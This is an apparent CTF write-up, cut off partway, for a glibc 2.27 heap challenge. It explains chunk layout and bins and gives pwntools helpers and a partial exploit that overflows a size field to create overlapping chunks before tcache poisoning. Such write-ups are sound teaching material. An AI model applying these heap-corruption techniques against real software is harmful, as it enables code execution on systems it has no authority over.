# Rings of Saturn 
### "We’ll go to the moons of Jupiter, at least some of the outer ones for sure, and probably Titan on Saturn" - Elon Musk
#### Author: RII
`nc 0.cloud.chals.io 12053`

#### Provided Files: ring_of_saturn,ring_of_saturn_dbg,libc.so.6

## tl;dr 
Heap Overflow->Change Chunk Size->Overlapping Chunks->Tcache Posin->Allocate chunk near free_hook->SHELL

First time doing a writeup for heap challenges so lets add the \-vvv flag
 
## Setup and Debugging
Since a libc was provide we want to use it locally so I use [pwninit](https://github.com/io12/pwninit) to setup the binary and avoid dealing with ld_preload issues. It is also very helpful as it can unstrip the libc and download debug symbols

`pwninit --bin ring_of_saturn --libc libc.so.6`

They gave us two binaries and I had no clue what dbg was at the time so I never bother using it, smart move I know. The symbols in libc allow for [pwn-dbg's](https://github.com/pwndbg/pwndbg) heap commands to work properly so I switched over from [gef](https://github.com/hugsy/gef)

Pwninit also can be configured to use your own template scripts, heres mine

```python 
from pwn import *

exe = ELF("./rings_of_saturn_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-2.27.so")

context.binary = exe
gdbscript = '''
set breakpoint pending on
c
'''

p = gdb.debug([exe.path], gdbscript=gdbscript)

```
Note: I use `gdb.debug` as `gdb.attach` has historically never worked for me

### Overview
Running the binary seems to give us a libc address and surprisingly gdb shows the its acutally a one_gadget as it says it is
```
 ~/ctf/space/ring_of_saturn $ gdb rings_of_saturn_patched
GNU gdb (GDB) 11.2
(gdb) r
Starting program: /home/ex4722/ctf/space/ring_of_saturn/rings_of_saturn_patched
Ok...I'll give you a one_gadget lol 0x7ffff7a33365
How large would you like your buffer to be, in bytes?
Must be (>= 1000)
> ^C
Program received signal SIGINT, Interrupt.
0x00007ffff7af4191 in __GI___libc_read (fd=0, buf=0x7ffff7dcfa83 <_IO_2_1_stdin_+131>, nbytes=1) at ../sysdeps/unix/sysv/linux/read.c:27
27      ../sysdeps/unix/sysv/linux/read.c: No such file or directory.
(gdb) x/2gx 0x7ffff7a33365
0x7ffff7a33365 <do_system+1045>:        0x310039e334358d48      0x894c00000002bfd2
```

```bash 
 ~/ctf/space/ring_of_saturn $ checksec rings_of_saturn
[*] '/home/ex4722/ctf/space/ring_of_saturn/rings_of_saturn'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```
Running checksec on the binary shows that theirs no PIE and the libc leak also means that aslr for libc has been defeated.

### Previous Knowleadge
Much of this writeup will not make any sense if you don't know much about how the heap works and basic exploits such as tcache poisoning and heap consolidation

This youtube playlist by [pwn colege](https://www.youtube.com/watch?v=coAJ4KyrWmY&list=PL-ymxv0nOtqoUdeKoKMxZBlfd9pD3mAah) was the one I personally started with 
This one by [azeria labs](https://azeria-labs.com/heap-exploitation-part-1-understanding-the-glibc-heap-implementation/) and this one by [dhavalkapil](https://heap-exploitation.dhavalkapil.com/introduction) are also great starting points.

I will provide the bare minium needed to solve this challange but I will assume the reader already read some of the supplymenaty mateirla 


## ~~Reverse Engineering~~ Dynamic Analysis
Usually I would open it up in ghidra and look around but I was too lazy do didn't bother until the end, I think that it acutally help me in this case as the decomp looked really bad
Running the program gives you a pretty good flow of execution and its pretty obvious that its a heap challenge with all those allocations

#### What we can do
0. Add- Calls malloc on the size given, larger than 1K so unsorted, tcache and large bin sizes
1. Remove- Calls free on a index
2. Print- outputs a TON of data but won't be as useful as we already have a libc leak
3. Write- Allows us to write to data to allocations and no size check here 
4. Quit- Calls exit but also prints a goodbye message

With this understanding I created a handful of helper functions to speed up testing
```python
index = 0
def malloc(size):
    global index
    p.recvuntil(b"> ")
    p.sendline(b"0")
    p.recvuntil(b"> ")
    p.sendline(str(size).encode('latin'))
    index += 1
    return index

def free(index):
    p.recvuntil(b"> ")
    p.sendline(b"1")
    p.recvuntil(b"> ")
    p.sendline(str(index).encode('latin'))

def dump():
    p.recvuntil(b"> ")
    p.sendline(b"2")
    p.recvuntil(b"\n0. add")
    # return p.clean()

def write(size, data):
    p.recvuntil(b"> ")
    p.sendline(b"3")
    p.recvuntil(b"> ")
    p.sendline(str(size).encode('latin'))
    p.sendline(data)
```

The malloc function seems to allocate chunks 24 larger than we requested. Looking at a allocated chunk in gdb we can tell that its storing a lot of extra program metadata here
```gdb
pwndbg> heap
... 
Allocated chunk | PREV_INUSE
Addr: 0x893280
Size: 0x401

Top chunk | PREV_INUSE
Addr: 0x893680
Size: 0x20981

pwndbg> x/10gx 0x893280
0x893280:       0x0000000000000000      0x0000000000000401     <--- Size of chunk in memory placed by malloc
0x893290:       0x00000000008932a8      0x0000000000893290     <--- First chunk points the start of user writebale data, Second points to the first chunk allocated???
0x8932a0:       0x00000000000003e8      0x0000000000000000     <--- Size of user writeable data that we specifed with
0x8932b0:       0x0000000000000000      0x0000000000000000
0x8932c0:       0x0000000000000000      0x0000000000000000
pwndbg>
```
### Heap basics
Once upon a time developers had to ask the kernal for memroy but only in pages which were huge. This lead to large overhead and memeory leaks so shared libraires sought to solve this issue by creating a system to request and return memory.
In particular glibc on linux uses malloc and free.

> The malloc() function allocates size bytes and returns a pointer to the allocated memory. 

> The free() function frees the memory space pointed to by ptr, which must have been returned by a previous call to malloc()

Chunks in memory contain a lot of information and is show in a diagram from the [malloc source code](https://code.woboq.org/userspace/glibc/malloc/malloc.c.html) itself
```
    chunk-> +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
            |             Size of previous chunk, if unallocated (P clear)  |
            +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
            |             Size of chunk, in bytes                     |A|M|P|
      mem-> +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
            |             User data starts here...                          .
            .                                                               .
            .             (malloc_usable_size() bytes)                      .
            .                                                               |
nextchunk-> +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
            |             (size of chunk, but used for application data)    |
            +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
            |             Size of next chunk, in bytes                |A|0|1|
            +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
```

Theirs a lot of infomration here but the main take aways is that the 
- The Size field of a chunk is BEFORE the user data 
- The size field of the next chunk is right after the user data of the chunk that comes before it

Once a chunk is freed it is assumed that the program won't use that chunk anymore so malloc can use it store its own data in it.
```
    chunk-> +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
            |             Size of previous chunk, if unallocated (P clear)  |
            +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
            |             Size of chunk, in bytes                     |A|0|P|
      mem-> +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
            |             FWD Pointer, next chunk                           |
            +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
            |             BCK Pointer,previous chunk                        |
            +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
            |             Unused space                                      |
            +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
nextchunk-> +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
            |             (size of chunk, but used for application data)    |
            +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
            |             Size of next chunk, in bytes                |A|0|1|
            +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
```
- Notice that the only diffence is in the user data and the last 2 bits of the size 
- The size now hold points to chunks that in its bin
- The bits after the size of chunk changed but the only important bit is the P which is PREV_INUSE bit. This bit tracks if the chunk before it is still in use


Bins is glibc's names for lists of freed chunks. Currently libc has unsorted, large, small, fast and tcache bins. For this exploit we will be targeting mostly tcache bins but having knowledge about the other bins is very helpful.
- Tcache is a faster layer of caching that take proptity added to libc in 2.27 and is a singly linked list
- Favoring speed meant that many security checks were sacrificed and attacks are easier as their are less secuity checks. 
- Each thread has 64 tcache bins, holding 7 chunks each of the same size
Learning about tcache is really hard on paper so I would recommend creating a malloc testbed to malloc and free chunks. Using pwb-dbg's heap command `bin` shows how the bins look
Here is a simple example that just malloced




<!-- Once upon a time developers realized that processes needed more memroy so implemented various system calls to map more memory in a process's memory space. In order to get some of this sweet sweet memroy all a procss had to do was make a syscall to `brk` and they would get a chunk mapped into its memory space. (mmap can be used but only for very large requests). This was great until you realized that developers are bad at managing memroy leading to leaks and syscalls have a lot of overhead. To solve this issue many libraires like glibc imprlemtn malloc and free. These functions usually ask for a larger chunk from the kernal and then break up its memory for progrma usage. Calling malloc() in glibc will return a pointer to a valid chunk of memory that is at least the size specified. Calling free will return that chunk so that other functions can use it. --> 



### Bug 
The write function looks kinda strange as it does not ask for an index but gdb shows that it just writes and wraps around the allocations.
It's pretty obvious that the write function has an overflow but what can we overwrite? With so much metadata placed by the program we could maybe overwrite one of them to screw with program interactions
Running our script in an interactive prompt allows us to call our helper functions and then break in gdb to examine the heap

```python
chunkA = malloc(1000)
chunkB = malloc(1000)
write(2000,b"A"*2000)
```

Before calling write the section between these chunks looks like this
```gdb 
pwndbg> x/10gx 0x1dbd670
0x1dbd670:      0x0000000000000000      0x0000000000000000
0x1dbd680:      0x0000000000000000      0x0000000000000411
0x1dbd690:      0x0000000001dbd6a8      0x0000000001dbd290
0x1dbd6a0:      0x00000000000003e8      0x0000000000000000
0x1dbd6b0:      0x0000000000000000      0x0000000000000000
```
After calling the write 
```gdb 
pwndbg> x/10gx 0x1dbd670
0x1dbd670:      0x4141414141414141      0x4141414141414141
0x1dbd680:      0x4141414141414141      0x4141414141414141    <--- Overflowed size field
0x1dbd690:      0x0000000001dbd6a8      0x0000000001dbd290
0x1dbd6a0:      0x00000000000003e8      0x4141414141414141
0x1dbd6b0:      0x4141414141414141      0x4141414141414141
```

#### TODO:
- Seems like we have a one quad-word overflow into the size field. Changing the size of chunks may not seems like much but with a bit of heap magic we can get an overlapping allocation as shown by this how2heap [writeup](https://github.com/shellphish/how2heap/blob/master/glibc_2.23/overlapping_chunks_2.c)
- Once we have an overlapping allocation we can poison the [tcache](https://github.com/shellphish/how2heap/blob/master/glibc_2.31/tcache_poisoning.c) by freeing a pointer then writing the metadata that is their.
- Using the poisoned tcache we can get an allocation near the free_hook leading to a shell 

### Overlapping Allocations
Much of my knowledge about this comes from [here](https://github.com/shellphish/how2heap/blob/master/glibc_2.23/overlapping_chunks_2.c). The overall goal of this exploit is to make a chunk larger than it acutally is so that it swallows a the next chunk leading to it being placed in a freed bin.
1. Allocate 4 chunks of the same size
2. Free the third chunk to tell malloc where the chunks end (4th chunk is needed to stop heap consolidation, if a chunk is freed right next to the top chunk it just merges with the top chunk)
3. Change the size field of chunk1 to be size(chunk1 + chunk2) 
4. Free chunk1, this will place it into the unsorted bin(Does not matter, just know it will be returned )
5. Allocate a chunk with size (chunk1 + chunk2) to get back our giant chunk, the second half of it will be the overlapping chunk

<!-- Some pseduo code: -->
<!-- ```python --> 
<!-- chunk1 = malloc(1000) -->
<!-- chunk2 = malloc(1000) -->
<!-- chunk3 = malloc(1000) -->
<!-- chunk4 = malloc(1000)  # Used to stop heap consolidation -->

<!-- free(chunk3) --> 

<!-- chunk1.size = 1000 + 1000 -->

<!-- free(chunk1)   # Thinks its size is 2000 so places it in its respective place(Unsorted Bin) -->

<!-- chunk1_and_2 = malloc(2000) # Returns giant chunk, first half is chunk1 and second half is chunk2 -->
<!-- ``` -->

Getting this working with the binary was a lot harder as it acted pretty funny with me but nothing gdb can't solve. 

#### Gotchuas: 
- The size of the chunk that we didn't allocate is the raw size without any extra padding (1000 in our case)
- Writing 1000 bytes to pad that chunk and then a size for chunk1 will be too much as malloc chunks contain metadata so writebale data is acutally the size of the chunk - 8
- The size we want to write is the sum of each chunk's size && 1, this is the PREV_INUSE bit and if its not set the binary crashes 
- When we call malloc to get the chunk back we need to ask for the giant chunks size - 24 -8 as 24 bytes are added by the progrma for its own metadata and 8 bytes for malloc metadata


```python 
chunk1 =  malloc(1000)
chunk2 =  malloc(1000)
chunk3 =  malloc(1000)
chunk4 =  malloc(1000)  # Stop top chunk consolidatation

free(chunk3)   # Tells chunk where to end

write(992, b'A'*992 )   # Padding for the first chunk
write(8, p64(0x410 + 0x410 + 1) )  # Overwrites size field, sizeof(chunk1) *2 & 1


free(chunk1)   # in unsorted bin
giant = malloc(0x820 - 8 - 24) # get back chunk1/chunk2, sub 8 for malloc metadata, sub 24 for progrma metadata

```

<!-- In the beginning the binary asks how large do you want a buffer it calls malloc on that size. This makes it easier for us as it means a chunk is allocated before our first freeable chunk so the first time we call write we'll acutally be writing to this chunk -->
<!-- If we call write it will write the first allocation and then eventaully flow into the next chunks size field. Using pwn-dbg's heap heap command we see that its size is 0x400(1000). However writing 1000 bytes then a size will acutally be too much as the size of a malloc chunk includes its metadata so the writeable data is acutally size-8 -->
<!-- In order to overwrite the size of chunk1 we can write (1000 - 8) bytes of padding and then 8 bytes then it will be the size of the next field. --> 
<!-- The size to write should be the size of the two chunks & 1 as the prev in use bit needs to be set so things don't crash -->
<!-- After we free this chunk and allocate it again we will get it back. This chunk's second half will be a duplicate of the --> 

### Poison Tcache
Malloc needs to keep track of freed memory so it uses a huge hiarchy to decide which bin(lists) to use. Their are many kinds of these lists but the one that this exploit uses is tcache. Tcache is a singly linked list of free heap allocations that can be used.
When we free a chunk it means the program no longer needs the storage so the malloc can use it as storage to store data about itself. Tcache take advantage of this and points to the next value in the list so that malloc only needs to keep on pointer to the head and then it can find eveyr other chunk





